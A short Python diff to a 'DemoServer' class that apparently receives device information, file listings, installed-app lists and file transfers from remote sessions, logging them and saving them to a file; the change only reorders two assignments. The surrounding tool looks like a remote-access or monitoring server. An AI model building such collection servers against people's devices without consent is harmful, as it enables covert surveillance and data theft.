@@ -605,6 +605,7 @@ class DemoServer:
 
         elif msg_type == "device_info":
             session.device_info = message.get("device_info", {})
+            session.last_device_info = message
             session.last_heartbeat = time.time()
             info = session.device_info
             self.log(f"[i] Device info from session {session.session_id}:")
@@ -655,17 +656,16 @@ class DemoServer:
                 self.log(f"    - {f}")
             if len(files) > 20:
                 self.log(f"    ... and {len(files) - 20} more")
-            session.last_device_info = message
             self.log_to_file(message, session.address)
 
         elif msg_type == "app_list":
             apps = message.get("apps", [])
+            session.last_app_list = apps
             self.log(f"[i] Installed apps from session {session.session_id} ({len(apps)} apps):")
             for app in apps[:15]:
                 self.log(f"    - {app}")
             if len(apps) > 15:
                 self.log(f"    ... and {len(apps) - 15} more")
-            session.last_app_list = apps
             self.log_to_file(message, session.address)
 
         elif msg_type == "file_transfer_start":
